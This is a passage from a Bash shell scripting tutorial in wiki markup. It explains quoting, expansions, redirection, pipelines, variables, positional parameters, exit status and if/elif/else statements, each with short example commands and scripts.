** Assuming the program &lt;tt&gt;rm&lt;/tt&gt; (&quot;remove&quot;) is installed, this command deletes the files &lt;tt&gt;foo.txt&lt;/tt&gt;, &lt;tt&gt;bar.txt&lt;/tt&gt;, and &lt;tt&gt;baz.txt&lt;/tt&gt; in the current directory.
** Bash finds the program &lt;tt&gt;rm&lt;/tt&gt; by searching through a configurable list of directories for a file named &lt;tt&gt;rm&lt;/tt&gt; that is executable (as determined by its file-permissions).
* &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;/foo/bar/baz bip.txt&lt;/source&gt;
** This command runs the program located at &lt;tt&gt;/foo/bar/baz&lt;/tt&gt;, passing &lt;tt&gt;bip.txt&lt;/tt&gt; as the sole argument.
** &lt;tt&gt;/foo/bar/baz&lt;/tt&gt; must be executable (as determined by its file-permissions).
** If &lt;tt&gt;/foo/bar/baz&lt;/tt&gt; is a text-file rather than a binary program, and its first line begins with &lt;tt&gt;#!&lt;/tt&gt;, then the remainder of that line determines the ''interpreter'' to use to run the file. For example, if the first line of &lt;tt&gt;/foo/bar/baz&lt;/tt&gt; is &lt;tt&gt;#!/bin/bash&lt;/tt&gt;, then the above command is equivalent to &lt;tt&gt;/bin/bash /foo/bar/baz bip.txt&lt;/tt&gt;.

That example with &lt;tt&gt;/foo/bar/baz&lt;/tt&gt; bears special note, since it illustrates how you can create a Bash-script that can be run like an ordinary program: just include &lt;tt&gt;#!/bin/bash&lt;/tt&gt; as the first line of the script (assuming that that is where Bash is located on your system; if not, adjust as needed), and make sure the script has the right file-permissions to be readable and executable. For the remainder of this book, all examples of complete shell scripts will begin with the line &lt;tt&gt;#!/bin/bash&lt;/tt&gt;.

===Quoting===

We saw above that the command &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm foo.txt bar.txt baz.txt&lt;/source&gt; removes three separate files: &lt;tt&gt;foo.txt&lt;/tt&gt;, &lt;tt&gt;bar.txt&lt;/tt&gt;, and &lt;tt&gt;baz.txt&lt;/tt&gt;. This happens because Bash splits the command into four separate words based on whitespace, and three of those words become arguments to the program &lt;tt&gt;rm&lt;/tt&gt;. But what if we need to delete a file whose name contains a space?

{{Bash Shell Scripting/caution|In Unix and GNU/Linux distributions, file names can contain spaces, tabs, newlines, and even control characters.}}

Bash offers several ''quoting mechanisms'' that are useful for this case; the most commonly used are single-quotes &lt;tt&gt;'&lt;/tt&gt; and double-quotes &lt;tt&gt;&quot;&lt;/tt&gt;. Either of these commands will delete a file named &lt;tt&gt;this file.txt&lt;/tt&gt;:

&lt;source lang=&quot;bash&quot;&gt;rm 'this file.txt'&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;rm &quot;this file.txt&quot;&lt;/source&gt;

Within the quotation marks, the space character loses its special meaning as a word-separator. Normally we wrap an entire word in quotation marks, as above, but in fact, only the space itself actually needs to be enclosed; &lt;tt&gt;this' 'file.txt&lt;/tt&gt; or &lt;tt&gt;this&quot; &quot;file.txt&lt;/tt&gt; is equivalent to &lt;tt&gt;'this file.txt'&lt;/tt&gt;.

Another commonly-used quoting mechanism is the backslash &lt;tt&gt;\&lt;/tt&gt;, but it works slightly differently; it quotes (or &quot;escapes&quot;) just one character. This command, therefore, is equivalent to the above:

&lt;source lang=&quot;bash&quot;&gt;rm this\ file.txt&lt;/source&gt;

In all of these cases, the quoting characters themselves are not passed in to the program. (This is called ''quote removal''.) As a result, &lt;tt&gt;rm&lt;/tt&gt; has no way of knowing whether it was invoked — for example — as &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm foo.txt&lt;/source&gt; or as &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm 'foo.txt'&lt;/source&gt;.

===Filename expansion and tilde expansion===

Bash supports a number of special notations, known as ''expansions'', for passing commonly-used types of arguments to programs.

One of these is ''filename expansion'', where a ''pattern'' such as &lt;tt&gt;*.txt&lt;/tt&gt; is replaced with the names of all files matching that pattern. For example, if the current directory contains the files &lt;tt&gt;foo.txt&lt;/tt&gt;, &lt;tt&gt;bar.txt&lt;/tt&gt;, &lt;tt&gt;this file.txt&lt;/tt&gt;, and &lt;tt&gt;something.else&lt;/tt&gt;, then this command:

&lt;source lang=&quot;bash&quot;&gt;echo *.txt&lt;/source&gt;

is equivalent to this command:

&lt;source lang=&quot;bash&quot;&gt;echo 'bar.txt' 'foo.txt' 'this file.txt'&lt;/source&gt;

Here the asterisk &lt;tt&gt;*&lt;/tt&gt; means &quot;zero or more characters&quot;; there are a few other special pattern characters (such as the question mark &lt;tt&gt;?&lt;/tt&gt;, which means &quot;exactly one character&quot;), and some other pattern-matching rules, but this use of &lt;tt&gt;*&lt;/tt&gt; is by far the most common use of patterns.

Filename expansion is not necessarily limited to files in the current directory. For example, if we want to list all files matching &lt;tt&gt;t*.sh&lt;/tt&gt; inside the directory &lt;tt&gt;/usr/bin&lt;/tt&gt;, we can write this:

&lt;source lang=&quot;bash&quot;&gt;echo /usr/bin/t*.sh&lt;/source&gt;

which may expand to something like this:

&lt;source lang=&quot;bash&quot;&gt;echo /usr/bin/test.sh /usr/bin/time.sh&lt;/source&gt;

If no files match a specified pattern, then no substitution happens; for example, this command:

&lt;source lang=&quot;bash&quot;&gt;echo asfasefasef*avzxv&lt;/source&gt;

will most likely just print &lt;tt&gt;asfasefasef*avzxv&lt;/tt&gt;.

{{Bash Shell Scripting/caution|1=If any filenames begin with a hyphen &lt;tt&gt;-&lt;/tt&gt;, then filename-expansion can sometimes have surprising consequences. For example, if a directory contains two files, named &lt;tt&gt;-n&lt;/tt&gt; and &lt;tt&gt;tmp.txt&lt;/tt&gt;, then &lt;tt&gt;cat *&lt;/tt&gt; expands to &lt;tt&gt;cat -n tmp.txt&lt;/tt&gt;, and &lt;tt&gt;cat&lt;/tt&gt; will interpret &lt;tt&gt;-n&lt;/tt&gt; as an option rather than a filename; instead, it is better to write &lt;tt&gt;cat ./*&lt;/tt&gt; or &lt;tt&gt;cat -- *&lt;/tt&gt;, which expand to &lt;tt&gt;cat ./-n ./tmp.txt&lt;/tt&gt; or &lt;tt&gt;cat -- -n tmp.txt&lt;/tt&gt;, removing this problem.}}

What happens if we have an actual file named &lt;tt&gt;*.txt&lt;/tt&gt; that we want to refer to? (Yes, filenames can contain asterisks!) Then we can use either of the quoting styles we saw above. Either of these:

&lt;source lang=&quot;bash&quot;&gt;cat '*.txt'&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;cat &quot;*.txt&quot;&lt;/source&gt;

will print the actual file &lt;tt&gt;*.txt&lt;/tt&gt;, rather than printing all files whose names end in &lt;tt&gt;.txt&lt;/tt&gt;.

Another, similar expansion is ''tilde expansion''. Tilde expansion has a lot of features, but the main one is this: in a word that consists solely of a tilde &lt;tt&gt;~&lt;/tt&gt;, or in a word that begins with &lt;tt&gt;~/&lt;/tt&gt; (tilde-slash), the tilde is replaced with the full path to the current user's home directory. For example, this command:

&lt;source lang=&quot;bash&quot;&gt;echo ~/*.txt&lt;/source&gt;

will print out the names of all files named &lt;tt&gt;*.txt&lt;/tt&gt; in the current user's home directory.

===Brace expansion===

Similar to filename expansion is ''brace expansion'', which is a compact way of representing multiple similar arguments. The following four commands are equivalent:

&lt;source lang=&quot;bash&quot;&gt;ls file1.txt file2.txt file3.txt file4.txt file5.txt&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;ls file{1,2,3,4,5}.txt&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;ls file{1..5..1}.txt&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;ls file{1..5}.txt&lt;/source&gt;

The first command lists each argument explicitly. The other three commands all use brace expansion to express the arguments more tersely: in the second command, all the possibilities &lt;tt&gt;1&lt;/tt&gt; through &lt;tt&gt;5&lt;/tt&gt; are given, separated by commas; in the third command, a numeric sequence is given (&quot;from 1 to 5, incrementing by 1&quot;); and the fourth command is the same as the third, but leaves the &lt;tt&gt;..1&lt;/tt&gt; implicit.

We can also list the files in the opposite order:

&lt;source lang=&quot;bash&quot;&gt;ls file5.txt file4.txt file3.txt file2.txt file1.txt&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;ls file{5,4,3,2,1}.txt&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;ls file{5..1..-1}.txt&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;ls file{5..1}.txt&lt;/source&gt;

with the default increment size being &lt;tt&gt;-1&lt;/tt&gt; when the endpoint of the sequence is less than the starting-point.

Since in Bash, the first word of a command is the program that is run, we could also write the command this way:

&lt;source lang=&quot;bash&quot;&gt;{ls,file{1..5}.txt}&lt;/source&gt;

but obviously that is not conducive to readability. (The same sort of thing, incidentally, can be done with filename expansion.)

Brace expansion, like filename expansion, can be disabled by any of the quoting mechanisms; &lt;tt&gt;'{'&lt;/tt&gt;, &lt;tt&gt;&quot;{&quot;&lt;/tt&gt;, or &lt;tt&gt;\{&lt;/tt&gt; produces an actual literal curly-brace.

===Redirecting output===

Bash allows a command's standard output (file-descriptor 1) to be sent to a file, rather than to the console. For example, the common utility program &lt;tt&gt;cat&lt;/tt&gt; writes out a file to standard output; if we redirect its standard output to a file, then we have the effect of copying the contents of one file into another file.

If we want to overwrite the destination file with the command's output, we use this notation:

&lt;source lang=&quot;bash&quot;&gt;cat input.txt &gt; output.txt&lt;/source&gt;

If we want to keep the existing contents of the destination file as they are, and merely append the command's output to the end, we use this notation:

&lt;source lang=&quot;bash&quot;&gt;cat input.txt &gt;&gt; output.txt&lt;/source&gt;

However, not everything that a program writes to the console goes through standard output. Many programs use standard error (file-descriptor 2) for error-messages and some types of &quot;logging&quot; or &quot;side-channel&quot; messages. If we wish for standard error to be combined with standard output, we can use either of these notations:

&lt;source lang=&quot;bash&quot;&gt;cat input.txt &amp;&gt;&gt; output.txt&lt;/source&gt;
&lt;source lang=&quot;bash&quot;&gt;cat input.txt &gt;&gt; output.txt 2&gt;&amp;1&lt;/source&gt;

If we wish for standard error to be appended to a different file from standard output, we use this notation:

&lt;source lang=&quot;bash&quot;&gt;cat input.txt &gt;&gt; output.txt 2&gt;&gt; error.txt&lt;/source&gt;

In fact, we can redirect ''only'' standard error, while leaving standard output alone:

&lt;source lang=&quot;bash&quot;&gt;cat input.txt 2&gt;&gt; error.txt&lt;/source&gt;

In all of the above examples, we can replace &lt;tt&gt;&gt;&gt;&lt;/tt&gt; with &lt;tt&gt;&gt;&lt;/tt&gt; if we want to overwrite the redirect-target rather than append to it.

Later we will see some more advanced things that we can do with output redirection.

===Redirecting input===

Just as Bash allows a program's output to be sent into a file, it also allows a program's input to be taken from a file. For example, the common Unix utility &lt;tt&gt;cat&lt;/tt&gt; copies its input to its output, such that this command:

&lt;source lang=&quot;bash&quot;&gt;cat &lt; input.txt&lt;/source&gt;

will write out the contents of &lt;tt&gt;input.txt&lt;/tt&gt; to the console.

As we have already seen, this trick is not needed in this case, since &lt;tt&gt;cat&lt;/tt&gt; can instead be instructed to copy a specified file to its output; the above command is simply equivalent to this one:

&lt;source lang=&quot;bash&quot;&gt;cat input.txt&lt;/source&gt;

This is the rule rather than the exception; most common Unix utilities that can take input from the console also have the built-in functionality to take their input from a file instead. In fact, many, including &lt;tt&gt;cat&lt;/tt&gt;, can take input from multiple files, making them even more flexible than the above. The following command prints out &lt;tt&gt;input1.txt&lt;/tt&gt; followed by &lt;tt&gt;input2.txt&lt;/tt&gt;:

&lt;source lang=&quot;bash&quot;&gt;cat input1.txt input2.txt&lt;/source&gt;

Nonetheless, input redirection has its uses, some of which we will see later on.

===A preview of pipelines===

Although they are outside the scope of this chapter, we now have the background needed for a first look at pipelines. A ''pipeline'' is a series of commands separated by the pipe character &lt;tt&gt;|&lt;/tt&gt;. Each command is run at the same time, and the output of each command is used as the input to the next command.

For example, consider this pipeline:

&lt;source lang=&quot;bash&quot;&gt;cat input.txt | grep foo | grep -v bar&lt;/source&gt;

We have already seen the &lt;tt&gt;cat&lt;/tt&gt; utility; &lt;tt&gt;cat input.txt&lt;/tt&gt; simply writes the file &lt;tt&gt;input.txt&lt;/tt&gt; to its standard output. The program &lt;tt&gt;grep&lt;/tt&gt; is a common Unix utility that filters (&quot;greps&quot;, in Unix parlance) based on a pattern; for example, the command &lt;tt&gt;grep foo&lt;/tt&gt; will print to its standard output any lines of input that contain the string &lt;tt&gt;foo&lt;/tt&gt;. The command &lt;tt&gt;grep -v bar&lt;/tt&gt; uses the &lt;tt&gt;-v&lt;/tt&gt; option to invert the pattern; the command prints any lines of input that ''don't'' contain the string &lt;tt&gt;bar&lt;/tt&gt;. Since the input to each command is the output of the previous command, the net result is that the pipeline prints any lines of &lt;tt&gt;input.txt&lt;/tt&gt; that ''do'' contain &lt;tt&gt;foo&lt;/tt&gt; and do ''not'' contain &lt;tt&gt;bar&lt;/tt&gt;.

==Variables==

In a Bash script, there are a few different kinds of ''parameters'' that can hold ''values''. One major kind of parameter is ''variables'': named parameters. If you are familiar with almost any other imperative programming language (such as C, BASIC, Fortran, or Pascal), then you are already familiar with variables. The following simple script uses the variable &lt;tt&gt;location&lt;/tt&gt; to hold the value &lt;tt&gt;world&lt;/tt&gt;, and prints out a &quot;Hello, world!&quot; message:

&lt;source lang=&quot;bash&quot;&gt;
location=world               # store &quot;world&quot; in the variable &quot;location&quot;
echo &quot;Hello, ${location}!&quot;   # print &quot;Hello, world!&quot;
&lt;/source&gt;

As you can see, the string &lt;tt&gt;${location}&lt;/tt&gt; in the second line was replaced by &lt;tt&gt;world&lt;/tt&gt; before that command was run. This substitution is known as ''variable expansion'', and it's more flexible than you might suspect. For example, it can even hold the name of the command to run:

&lt;source lang=&quot;bash&quot;&gt;
cmd_to_run=echo                   # store &quot;echo&quot; in the variable &quot;cmd_to_run&quot;
&quot;${cmd_to_run}&quot; 'Hello, world!'   # print &quot;Hello, world!&quot;
&lt;/source&gt;

In both of the above examples, we have used the notation &lt;tt&gt;${&lt;var&gt;variable_name&lt;/var&gt;}&lt;/tt&gt; to perform the variable expansion. The briefer notation &lt;tt&gt;$&lt;var&gt;variable_name&lt;/var&gt;&lt;/tt&gt; − without curly brackets − would have the same effect in these cases. Sometimes the curly brackets are necessary (for example, &lt;tt&gt;${foo}bar&lt;/tt&gt; cannot be written as &lt;tt&gt;$foobar&lt;/tt&gt;, because the latter would be interpreted as &lt;tt&gt;${foobar}&lt;/tt&gt;), but they can usually be omitted, and real-world scripts usually omit them.

Of course, needless to say, the above are not very realistic examples; they demonstrate only ''how'' to use variables, not ''why'' or ''when'' to use them. If you are familiar with other imperative programming languages, then it is probably already obvious to you why and when you would use variables; if not, then this should become clear as you read through this book and see examples that use them more realistically.

You may have noticed that we have used double-quotes &lt;tt&gt;&quot;&lt;/tt&gt;, rather than single-quotes &lt;tt&gt;'&lt;/tt&gt;, for character-strings that include variable expansions. This is because single-quotes prevent variable expansion; a command such as &lt;tt&gt;echo '${location}'&lt;/tt&gt; will print the actual string &lt;tt&gt;${location}&lt;/tt&gt;, rather than printing the value of a variable named &lt;tt&gt;location&lt;/tt&gt;.

It is generally a good idea to wrap variable expansions in double-quotes, because otherwise the results of variable expansion will undergo filename expansion, as well as ''word splitting'' (whereby white-space is used to separate the words that make up a command). For example, this script:

&lt;source lang=&quot;bash&quot;&gt;
foo='a  b*'    # store &quot;a  b*&quot; in the variable &quot;foo&quot;
echo $foo
&lt;/source&gt;

is liable to print something like &lt;tt&gt;a ba.txt bd.sh&lt;/tt&gt;, which is probably not what we want. Real-world scripts frequently do not include double-quotes except when they are clearly necessary, but this practice sometimes leads to confusing bugs.

{{Bash Shell Scripting/tip|It is generally a good idea to wrap variable expansions in double-quotes; for example, use &lt;tt&gt;&quot;$var&quot;&lt;/tt&gt; rather than &lt;tt&gt;$var&lt;/tt&gt;.}}

A number of variables have special significance. For example, the variable &lt;tt&gt;PATH&lt;/tt&gt; determines the list of directories that Bash should search in when trying to run an external program; if it is set to &lt;tt&gt;/usr/bin:/bin&lt;/tt&gt;, then the command &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;cp src.txt dst.txt&lt;/source&gt; will look to run either &lt;tt&gt;/usr/bin/cp&lt;/tt&gt; or &lt;tt&gt;/bin/cp&lt;/tt&gt;. The variable &lt;tt&gt;HOME&lt;/tt&gt; is pre-initialized to the current user's home directory, and it determines the behavior of tilde-expansion. For example, if a script sets &lt;tt&gt;HOME=/foo&lt;/tt&gt;, then &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;echo ~/bar&lt;/source&gt; will print &lt;tt&gt;/foo/bar&lt;/tt&gt;. (This will not actually change the user's home directory, however.)

==Positional parameters==

In most of the above commands — both those that run a built-in command, and those than use an external program — we have supplied one or more ''arguments'', that indicate what the command should operate on. For example, when we invoke the common Unix utility &lt;tt&gt;mkdir&lt;/tt&gt; (&quot;make directory&quot;) to create a new directory, we invoke it with a command like this one:

&lt;source lang=&quot;bash&quot;&gt;mkdir tmp&lt;/source&gt;

where &lt;tt&gt;tmp&lt;/tt&gt; is the name of the new directory to create.

And as we have seen, Bash scripts are themselves programs that can be run. So it goes without saying that they, too, can take arguments. These arguments are available to the program as its ''positional parameters''. Earlier, we saw that variables are one kind of parameter. Positional parameters are very similar, but are identified by numbers rather than by names. For example, &lt;tt&gt;$1&lt;/tt&gt; (or &lt;tt&gt;${1}&lt;/tt&gt;) expands to the script's first argument. So, suppose we want to create a simple script called &lt;tt&gt;mkfile.sh&lt;/tt&gt; that takes two arguments — a filename, and a line of text — and creates the specified file with the specified text. We can write it as follows:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
echo &quot;$2&quot; &gt; &quot;$1&quot;&lt;/source&gt;

and (after making it executable by running &lt;tt&gt;chmod +x mkfile.sh&lt;/tt&gt;) we can run it as follows:

&lt;source lang=&quot;bash&quot;&gt;./mkfile.sh file-to-create.txt 'line to put in file'&lt;/source&gt;

We can also refer to all of the arguments at once by using &lt;tt&gt;$@&lt;/tt&gt;, which expands to ''all'' of the positional parameters, in order. When wrapped in double-quotes, as &lt;tt&gt;&quot;$@&quot;&lt;/tt&gt;, each argument becomes a separate word. (Note: the alternative &lt;tt&gt;$*&lt;/tt&gt; is perhaps more common, but &lt;tt&gt;&quot;$*&quot;&lt;/tt&gt; becomes a single word, with spaces in between the original parameters. &lt;tt&gt;&quot;$@&quot;&lt;/tt&gt; is almost always preferable to either &lt;tt&gt;$@&lt;/tt&gt; or &lt;tt&gt;$*&lt;/tt&gt;, which allow an argument to become split into multiple words if it contains whitespace, and to &lt;tt&gt;&quot;$*&quot;&lt;/tt&gt;, which combines multiple arguments into a single word.) This is often useful in concert with the built-in command &lt;tt&gt;shift&lt;/tt&gt;, which removes the first positional parameter, such that &lt;tt&gt;$2&lt;/tt&gt; becomes &lt;tt&gt;$1&lt;/tt&gt;, &lt;tt&gt;$3&lt;/tt&gt; becomes &lt;tt&gt;$2&lt;/tt&gt;, and so on. For example, if we change &lt;tt&gt;mkfile.sh&lt;/tt&gt; as follows:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash
file=&quot;$1&quot; # save the first argument as &quot;$file&quot;
shift # drop the first argument from &quot;$@&quot;
echo &quot;$@&quot; &gt; &quot;$file&quot; # write the remaining arguments to &quot;$file&quot;&lt;/source&gt;

then we can run it as follows:

&lt;source lang=&quot;bash&quot;&gt;./mkfile.sh file-to-create.txt line to put in file&lt;/source&gt;

and all of the arguments, except the filename, will be written to the file.

The number of positional parameters is available as &lt;tt&gt;$#&lt;/tt&gt;; for example, if &lt;tt&gt;$#&lt;/tt&gt; is &lt;tt&gt;3&lt;/tt&gt;, then the positional parameters are &lt;tt&gt;$1&lt;/tt&gt;, &lt;tt&gt;$2&lt;/tt&gt;, and &lt;tt&gt;$3&lt;/tt&gt;.

Note that positional parameters beyond &lt;tt&gt;$9&lt;/tt&gt; require the curly braces; should you need to refer to the tenth argument, for example, you must write &lt;tt&gt;${10}&lt;/tt&gt; rather than &lt;tt&gt;$10&lt;/tt&gt;. (The latter would be interpreted as &lt;tt&gt;${1}0&lt;/tt&gt;.) That said, it is not usually a good idea to have so many arguments with specific meanings, since it is hard for users to keep track of them. If you find yourself specifically referring to your script's tenth argument, it may be worth re-evaluating your approach.

If you have some experience with Bash, or with Unix utilities, you've most likely noticed that many commands can take various &quot;options&quot;, indicated with a leading hyphen &lt;tt&gt;-&lt;/tt&gt;, in addition to their regular arguments. For example, &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm &quot;$filename&quot;&lt;/source&gt; deletes an individual file, while &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm -r &quot;$dirname&quot;&lt;/source&gt; deletes an entire directory with all of its contents. (The &lt;tt&gt;-r&lt;/tt&gt; is short for &quot;recursive&quot;: the command &quot;recursively&quot; deletes an entire tree of directories.) These options are actually just arguments. In &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm &quot;$filename&quot;&lt;/source&gt;, there is just one argument (&lt;tt&gt;&quot;$filename&quot;&lt;/tt&gt;), while in &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm -r &quot;$dirname&quot;&lt;/source&gt; there are two (&lt;tt&gt;-r&lt;/tt&gt; and &lt;tt&gt;&quot;$dirname&quot;&lt;/tt&gt;). In a sense, there is nothing inherently special about these arguments, but this notation for options is so widespread as to be considered standard; many or most of the Bash built-in commands can accept various options, and later we will see various techniques for supporting options as arguments to our Bash scripts.

==Exit status==

When a process completes, it returns a small non-negative integer value, called its ''exit status'' or its ''return status'', to the operating system. By convention, it returns zero if it completed successfully, and a positive number if it failed with an error. (This approach allows multiple different errors to be distinguished by using different positive numbers.) A Bash script can obey this convention by using the built-in command &lt;tt&gt;exit&lt;/tt&gt;. The following command:

&lt;source lang=&quot;bash&quot;&gt;exit 4&lt;/source&gt;

terminates the shell script, returning an exit status of four, indicating some sort of error. When no exit status is specified (either because &lt;tt&gt;exit&lt;/tt&gt; is run with no argument, or because the script ends without calling &lt;tt&gt;exit&lt;/tt&gt;), the script returns the exit status of the last command it ran.

One way that exit statuses are used is with the Bash operators &lt;tt&gt;&amp;&amp;&lt;/tt&gt; (&quot;and&quot;) and &lt;tt&gt;||&lt;/tt&gt; (&quot;or&quot;). If two commands are separated by &lt;tt&gt;&amp;&amp;&lt;/tt&gt;, then the command on the left is run first, and the command on the right is only run if the first command succeeds. Conversely, if they are separated by &lt;tt&gt;||&lt;/tt&gt;, then the command on the right is only run if the command on the left fails.

For example, suppose we want to delete the file &lt;tt&gt;file.txt&lt;/tt&gt; and recreate it as a blank file. We can delete it using the common Unix utility &lt;tt&gt;rm&lt;/tt&gt; (&quot;remove&quot;), and recreate it using the common Unix utility &lt;tt&gt;touch&lt;/tt&gt;; so, we might write this:

&lt;source lang=&quot;bash&quot;&gt;rm file.txt
touch file.txt&lt;/source&gt;

But really, if &lt;tt&gt;rm&lt;/tt&gt; fails, we don't want to run &lt;tt&gt;touch&lt;/tt&gt;: we don't want to recreate the file if we failed to delete it to begin with. So, we can write this instead:

&lt;source lang=&quot;bash&quot;&gt;rm file.txt &amp;&amp; touch file.txt&lt;/source&gt;

This is the same as before, except that it won't try to run &lt;tt&gt;touch&lt;/tt&gt; unless &lt;tt&gt;rm&lt;/tt&gt; has succeeded.

A third Boolean-like operator, &lt;tt&gt;!&lt;/tt&gt; (&quot;not&quot;), inverts the exit status of a command. For example, this command:

&lt;source lang=&quot;bash&quot;&gt;! rm file.txt&lt;/source&gt;

is equivalent to &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;rm file.txt&lt;/source&gt;, except that it will indicate success if &lt;tt&gt;rm&lt;/tt&gt; indicates failure, and vice versa. (This is not usually useful when exit statuses are used as actual exit statuses, indicating success or failure, but we will soon see some extended uses of exit statuses where a &quot;not&quot; operation is more useful.)

The exit status of a command is (briefly) available as &lt;tt&gt;$?&lt;/tt&gt;. This can be useful when it is necessary to distinguish between multiple different failure statuses; for example, the &lt;tt&gt;grep&lt;/tt&gt; command (which searches for lines in a file that match a specified pattern) returns 0 if it finds a match, 1 if it finds no matches, and 2 if a genuine error occurs.

==Conditional expressions and &lt;tt&gt;if&lt;/tt&gt; statements==

Very often, we want to run a certain command only if a certain condition is met. For example, we might want to run the command &lt;source lang=&quot;bash&quot; enclose=&quot;none&quot;&gt;cp source.txt destination.txt&lt;/source&gt; (&quot;copy the file &lt;tt&gt;source.txt&lt;/tt&gt; to location &lt;tt&gt;destination.txt&lt;/tt&gt;&quot;) if, and only if, &lt;tt&gt;source.txt&lt;/tt&gt; exists. We can do that like this:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if [[ -e source.txt ]] ; then
  cp source.txt destination.txt
fi&lt;/source&gt;

The above uses two built-in commands:

* The construction &lt;tt&gt;[[&lt;nowiki/&gt; ''condition'' ]]&lt;/tt&gt; returns an exit status of zero (success) if &lt;tt&gt;''condition''&lt;/tt&gt; is true, and a nonzero exit status (failure) if &lt;tt&gt;''condition''&lt;/tt&gt; is false. In our case, &lt;tt&gt;''condition''&lt;/tt&gt; is &lt;tt&gt;-e source.txt&lt;/tt&gt;, which is true if and only if there exists a file named &lt;tt&gt;source.txt&lt;/tt&gt;.
* The construction &lt;dl&gt;&lt;dd&gt;&lt;tt&gt;if ''command1'' ; then&lt;br/&gt;&amp;nbsp; ''command2''&lt;br/&gt;fi&lt;/tt&gt;&lt;/dl&gt;&lt;/dd&gt; first runs &lt;tt&gt;''command1''&lt;/tt&gt;; if that completes successfully (that is, if its exit status is zero), then it goes on to run &lt;tt&gt;''command2''&lt;/tt&gt;.

In other words, the above is equivalent to this:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

[[ -e source.txt ]] &amp;&amp; cp source.txt destination.txt&lt;/source&gt;

except that it is more clear (and more flexible, in ways that we will see shortly).

In general, Bash treats a successful exit status (zero) as meaning &quot;true&quot; and a failed exit status (nonzero) as meaning &quot;false&quot;, and vice versa. For example, the built-in command &lt;tt&gt;true&lt;/tt&gt; always &quot;succeeds&quot; (returns zero), and the built-in command &lt;tt&gt;false&lt;/tt&gt; always &quot;fails&quot; (returns one).

{{Bash Shell Scripting/caution|In many commonly-used programming languages, zero is considered &quot;false&quot; and nonzero values are considered &quot;true&quot;. Even in Bash, this is true within arithmetic expressions (which we'll see later on). But at the level of commands, the reverse is true: an exit status of zero means &quot;successful&quot; or &quot;true&quot; and a nonzero exit status means &quot;failure&quot; or &quot;false&quot;.}}
{{-}}
{{Bash Shell Scripting/caution|Be sure to include spaces before and after &lt;tt&gt;&amp;#x5B;&amp;#x5B;&lt;/tt&gt; and &lt;tt&gt;&amp;#x5D;&amp;#x5D;&lt;/tt&gt; so that Bash recognizes them as separate words. Something like &lt;tt&gt;if&amp;#x5B;&amp;#x5B;&lt;/tt&gt; or &lt;tt&gt;&amp;#x5B;&amp;#x5B;-e&lt;/tt&gt; will not work properly.}}

===&lt;tt&gt;if&lt;/tt&gt; statements===

&lt;tt&gt;if&lt;/tt&gt; statements are more flexible than we saw above; we can actually specify ''multiple'' commands to run if the test-command succeeds, and in addition, we can use an &lt;tt&gt;else&lt;/tt&gt; clause to specify one or more commands to run instead if the test-command ''fails'':

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if [[ -e source.txt ]] ; then
  echo 'source.txt exists; copying to destination.txt.'
  cp source.txt destination.txt
else
  echo 'source.txt does not exist; exiting.'
  exit 1 # terminate the script with a nonzero exit status (failure)
fi&lt;/source&gt;

The commands can even include other &lt;tt&gt;if&lt;/tt&gt; statements; that is, one &lt;tt&gt;if&lt;/tt&gt; statement can be &quot;nested&quot; inside another. In this example, an &lt;tt&gt;if&lt;/tt&gt; statement is nested inside another &lt;tt&gt;if&lt;/tt&gt; statement's &lt;tt&gt;else&lt;/tt&gt; clause:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if [[ -e source1.txt ]] ; then
  echo 'source1.txt exists; copying to destination.txt.'
  cp source1.txt destination.txt
else
  if [[ -e source2.txt ]] ; then
    echo 'source1.txt does not exist, but source2.txt does.'
    echo 'Copying source2.txt to destination.txt.'
    cp source2.txt destination.txt
  else
    echo 'Neither source1.txt nor source2.txt exists; exiting.'
    exit 1 # terminate the script with a nonzero exit status (failure)
  fi
fi&lt;/source&gt;

This particular pattern — an &lt;tt&gt;else&lt;/tt&gt; clause that contains exactly one &lt;tt&gt;if&lt;/tt&gt; statement, representing a fallback-test — is so common that Bash provides a convenient shorthand notation for it, using &lt;tt&gt;elif&lt;/tt&gt; (&quot;else-if&quot;) clauses. The above example can be written this way:

&lt;source lang=&quot;bash&quot;&gt;#!/bin/bash

if [[ -e source1.txt ]] ; then
  echo 'source1.txt exists; copying to destination.txt.'
  cp source1.txt destination.txt
elif [[ -e source2.txt ]] ; then
  echo 'source1.txt does not exist, but source2.txt does.'
  echo 'Copying source2.txt to destination.txt.'
  cp source2.txt destination.txt
else
  echo 'Neither source1.txt nor source2.txt exists; exiting.'
  exit 1 # terminate the script with a nonzero exit status (failure)
fi&lt;/source&gt;

A single &lt;tt&gt;if&lt;/tt&gt; statement can have any number of &lt;tt&gt;elif&lt;/tt&gt; clauses, representing any number of fallback conditions.

Lastly, sometimes we want to run a command if a condition is false, without there being any corresponding command to run if the condition is true. For this we can use the built-in &lt;tt&gt;!&lt;/tt&gt; operator, which precedes a command; when the command returns zero (success or &quot;true&quot;), the &lt;tt&gt;!&lt;/tt&gt; operator changes returns a nonzero value (failure or &quot;false&quot;), and vice versa. For example, the following statement will copy &lt;tt&gt;source.txt&lt;/tt&gt; to &lt;tt&gt;destination.txt&lt;/tt&gt; unless &lt;tt&gt;destination.txt&lt;/tt&gt; already exists:

